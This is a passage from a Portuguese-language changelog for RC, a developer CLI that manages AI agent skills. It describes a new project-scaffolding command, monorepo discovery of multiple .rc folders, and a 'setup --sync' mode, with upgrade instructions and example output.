- **Scaffold de projeto novo a partir do template TypeScript da rodolfochicone.** Duas
  frentes para começar um projeto do zero:

  **Comando `rc init [nome]`:** cria um repositório **privado** na organização
  **rodolfochicone** a partir do template `rodolfochicone/typescript-template` e o clona em
  `./<nome>/` no diretório atual (`gh repo create … --template … --private --clone`).
  - Fluxo **híbrido** do nome: com argumento usa direto; sem argumento e em
    terminal interativo, pergunta o nome (com validação); sem TTY e sem nome,
    retorna erro acionável em vez de travar.
  - Pré-valida o GitHub CLI e, em erro de configuração, **orienta como
    configurar**: `gh` não instalado, não autenticado ou sem acesso à org
    rodolfochicone — cada caso com comandos copiáveis, sem stacktrace.

  **Skill `rc-new-project`:** versão agêntica (Claude/Codex) do mesmo fluxo, com
  fases em ordem, confirmação no passo externo, comandos `gh` explícitos,
  orientação de configuração do GitHub e verificação real do clone antes de
  declarar sucesso.

## [0.10.0] - 2026-06-21

### Added

- **Suporte a monorepos com múltiplas pastas `.rc`.** O RC agora descobre a pasta
  `.rc` ativa em projetos que têm mais de uma (ex.: `packages/*/.rc`, `apps/*/.rc`),
  tanto nas skills quanto no binário.

  **Binário (`internal/core/workspace`):**
  - A descoberta continua caminhando **para cima** do diretório atual até o `.rc`
    mais próximo (então `cd <subprojeto> && rc ...` já escolhe o `.rc` certo).
  - Quando **nenhum** `.rc` existe acima, agora busca **para baixo** (ignorando
    `node_modules`, `.git`, `vendor`, `_archived`, limitada à profundidade 6):
    - **1 encontrado** → usa automaticamente.
    - **2+ encontrados** → erro claro listando os candidatos, pedindo `cd` no
      subprojeto ou `--workspace <dir>`.
    - **0 encontrados** → mantém o comportamento atual (raiz como workspace).
  - Nova flag global **`--workspace <dir>`** em todos os comandos para apontar o
    `.rc`/subprojeto explicitamente, sem precisar dar `cd`.

  **Skills:** `rc-create-prd` e `rc-idea-factory` perguntam em qual `.rc` salvar
  quando há mais de uma; `rc-create-techspec`, `rc-create-tasks`, `rc-review-round`
  e `rc-code-review` localizam o `.rc` que contém a tarefa (`<NN>-<slug>`) e só
  perguntam em caso de ambiguidade; `rc-readme` varre todos os `.rc` por ADRs.
  Projetos de pasta única (com ou sem `.rc`) seguem idênticos — sem perguntas novas.

#### Como atualizar o RC

```bash
rc upgrade
```

> ⚠️ O repositório é privado, então o `rc upgrade` precisa de um token. Garanta no
> shell (`~/.zshrc`):
>
> ```bash
> export GH_TOKEN="$(gh auth token)"
> ```

Confirme a versão depois:

```bash
rc --version   # deve mostrar v0.10.0
```

## [0.9.0] - 2026-06-21

### Added

- **`rc setup --sync`** — novo modo de sincronização de skills. Rodando dentro de
  um projeto, ele reconcilia as skills bundled do RC com a versão do binário:
  - ✅ **Atualiza** as skills bundled que o projeto já tem (quando mudaram).
  - ➕ **Adiciona** as skills bundled que estão faltando.
  - ⏭️ **Ignora** as que já estão atualizadas (não reescreve à toa).
  - 🔒 **Não toca** em skills de terceiros/customizadas no mesmo diretório.

#### Como atualizar o RC

```bash
rc upgrade
```

> ⚠️ O repositório é privado, então o `rc upgrade` precisa de um token. Garanta no
> shell (`~/.zshrc`):
>
> ```bash
> export GH_TOKEN="$(gh auth token)"
> ```
>
> Sem isso, o `upgrade` silenciosamente não faz nada.

Confirme a versão depois:

```bash
rc --version   # deve mostrar v0.9.0
```

#### Como usar o comando

```bash
# Claude Code (aceita "claude" ou "claude-code")
rc setup --sync --agent claude

# Codex
rc setup --sync --agent codex
```

Flags combináveis:

| Flag              | Efeito                                                                              |
| ----------------- | ---------------------------------------------------------------------------------- |
| `--agent <nome>`  | Agente alvo (repetível). `claude` → `.claude/skills/`, `codex` → `.agents/skills/` |
| `--yes` / `-y`    | Não-interativo (útil em scripts/CI)                                                |
| `--global` / `-g` | Sincroniza no diretório do usuário em vez do projeto                               |
| `--copy`          | Copia arquivos em vez de symlink                                                   |

Exemplos:

```bash
# Projeto, Claude, sem prompts
rc setup --sync --agent claude --yes

# Vários agentes de uma vez
rc setup --sync --agent claude --agent codex --yes

# Escopo global (na máquina, não no projeto)
rc setup --sync --agent claude --global --yes
```

> ❌ `--sync` não combina com `--all` nem `--skill` (eles selecionam catálogos
> explícitos e contrariam a ideia de sincronizar). O comando avisa se for usado junto.

#### Exemplo de saída

```
Sync Claude Code (project scope)

  ✓ Added (3)
    ✓  rc-readme        ./.claude/skills/rc-readme
    ✓  rc-postman       ./.claude/skills/rc-postman
    ✓  rc-openapi       ./.claude/skills/rc-openapi
  ✓ Updated (1)
    ✓  rc-create-prd    ./.claude/skills/rc-create-prd
  Unchanged  11 already current
```

#### Fluxo recomendado para o time

1. `rc upgrade` (atualiza o binário para v0.9.0).
2. Dentro de cada projeto: `rc setup --sync --agent claude --yes` (ou `codex`).
3. Repetir o passo 2 sempre que sair uma nova versão do RC — só o que mudou é atualizado.

## [0.2.4] - 2026-06-13

### Added
- Initial RC release

<!-- GitHub releases (apenas versões que têm seção acima e release publicado) -->
[Unreleased]: https://github.com/rodolfochicone/rc-project/compare/v3.2.0...main
[3.2.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v3.2.0
[3.1.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v3.1.0
[3.0.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v3.0.0
[2.6.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.6.0
[2.5.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.5.0
[2.4.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.4.0
[2.3.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.3.0
[2.2.1]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.2.1
[2.2.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.2.0
[2.1.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.1.0
[1.0.1]: https://github.com/rodolfochicone/rc-project/releases/tag/v1.0.1
[1.0.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v1.0.0
